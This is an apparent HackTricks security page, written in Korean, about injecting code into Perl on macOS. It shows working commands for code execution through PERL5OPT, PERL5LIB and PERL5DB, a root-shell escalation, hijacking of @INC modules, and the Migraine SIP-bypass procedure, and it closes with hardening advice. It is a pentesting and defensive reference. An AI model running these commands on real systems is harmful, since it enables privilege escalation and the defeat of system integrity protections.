# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` 및 `PERL5LIB` 환경 변수를 통한 방법

환경 변수 **`PERL5OPT`**를 사용하면 **Perl**이 인터프리터가 시작될 때 임의의 명령을 실행하도록 할 수 있습니다(대상 스크립트의 첫 번째 줄이 구문 분석되기 **전**에). 예를 들어, 이 스크립트를 생성합니다:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
이제 **환경 변수를 내보내고** **perl** 스크립트를 실행합니다:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
또 다른 옵션은 Perl 모듈을 만드는 것입니다 (예: `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
그런 다음 env 변수를 사용하여 모듈이 자동으로 위치하고 로드되도록 합니다:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### 다른 흥미로운 환경 변수

* **`PERL5DB`** – 인터프리터가 **`-d`** (디버거) 플래그로 시작되면, `PERL5DB`의 내용이 디버거 컨텍스트 *내부*에서 Perl 코드로 실행됩니다. 특권 Perl 프로세스의 환경 **및** 명령줄 플래그를 모두 영향을 미칠 수 있다면 다음과 같은 작업을 수행할 수 있습니다:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # 스크립트를 실행하기 전에 셸을 드롭합니다
```

* **`PERL5SHELL`** – Windows에서 이 변수는 Perl이 셸을 생성해야 할 때 사용할 셸 실행 파일을 제어합니다. macOS에서는 관련이 없기 때문에 완전성을 위해 여기 언급됩니다.

`PERL5DB`는 `-d` 스위치를 요구하지만, 이 플래그가 활성화된 상태로 *root*로 실행되는 유지 관리 또는 설치 스크립트를 찾는 것은 일반적이며, 이 변수는 유효한 상승 벡터가 됩니다.

## 의존성을 통한 (@INC 남용)

Perl이 검색할 포함 경로 (**`@INC`**)를 나열하는 것은 다음을 실행하여 가능합니다:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14에서의 일반적인 출력은 다음과 같습니다:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
일부 반환된 폴더는 존재하지 않지만, **`/Library/Perl/5.30`**는 존재하며 SIP에 의해 보호되지 않고 SIP로 보호된 폴더보다 *앞에* 있습니다. 따라서, *root*로 쓸 수 있다면 악성 모듈(예: `File/Basename.pm`)을 드롭할 수 있으며, 이는 해당 모듈을 가져오는 모든 권한 있는 스크립트에 의해 *우선적으로* 로드됩니다.

> [!WARNING]
> `/Library/Perl` 내부에 쓰기 위해서는 여전히 **root** 권한이 필요하며, macOS는 쓰기 작업을 수행하는 프로세스에 대해 *전체 디스크 접근*을 요청하는 **TCC** 프롬프트를 표시합니다.

예를 들어, 스크립트가 **`use File::Basename;`**를 가져오고 있다면, 공격자가 제어하는 코드를 포함하는 `/Library/Perl/5.30/File/Basename.pm`을 생성하는 것이 가능할 것입니다.

## Migration Assistant를 통한 SIP 우회 (CVE-2023-32369 “Migraine”)

2023년 5월, Microsoft는 **CVE-2023-32369**를 공개했으며, 이는 **Migraine**이라는 별명을 가진 포스트 익스플로잇 기술로, *root* 공격자가 **시스템 무결성 보호(SIP)**를 완전히 **우회**할 수 있게 해줍니다. 취약한 구성 요소는 **`systemmigrationd`**로, **`com.apple.rootless.install.heritable`** 권한을 가진 데몬입니다. 이 데몬에 의해 생성된 모든 자식 프로세스는 해당 권한을 상속받아 SIP 제한 외부에서 실행됩니다.

연구자들이 확인한 자식 프로세스 중에는 Apple 서명 인터프리터가 포함되어 있습니다:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perl은 `PERL5OPT`를 존중하고 (Bash는 `BASH_ENV`를 존중하므로), 데몬의 *환경*을 오염시키는 것만으로도 SIP가 없는 컨텍스트에서 임의 실행을 얻기에 충분합니다:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC`가 실행되면, `/usr/bin/perl`이 악성 `PERL5OPT`와 함께 시작되고 `/private/tmp/migraine.sh`를 실행합니다 *SIP가 다시 활성화되기 전에*. 그 스크립트에서 예를 들어, **`/System/Library/LaunchDaemons`** 안에 페이로드를 복사하거나 `com.apple.rootless` 확장 속성을 할당하여 파일을 **삭제할 수 없게** 만들 수 있습니다.

Apple은 macOS **Ventura 13.4**, **Monterey 12.6.6** 및 **Big Sur 11.7.7**에서 이 문제를 수정했지만, 이전 버전이나 패치되지 않은 시스템은 여전히 취약합니다.

## Hardening recommendations

1. **위험한 변수 지우기** – 권한이 있는 launchdaemons 또는 cron 작업은 깨끗한 환경에서 시작해야 합니다 (`launchctl unsetenv PERL5OPT`, `env -i` 등).
2. **필요하지 않는 한 root로 인터프리터 실행 피하기**. 컴파일된 바이너리를 사용하거나 권한을 조기에 낮추십시오.
3. **`-T` (taint mode)로 공급업체 스크립트 사용하기**. 이렇게 하면 Perl이 taint 검사가 활성화될 때 `PERL5OPT` 및 기타 안전하지 않은 스위치를 무시합니다.
4. **macOS를 최신 상태로 유지하기** – “Migraine”은 현재 릴리스에서 완전히 패치되었습니다.

## References

- Microsoft Security Blog – “New macOS vulnerability, Migraine, could bypass System Integrity Protection” (CVE-2023-32369), May 30 2023.
- Hackyboiz – “macOS SIP Bypass (PERL5OPT & BASH_ENV) research”, May 2025.

{{#include ../../../banners/hacktricks-training.md}}
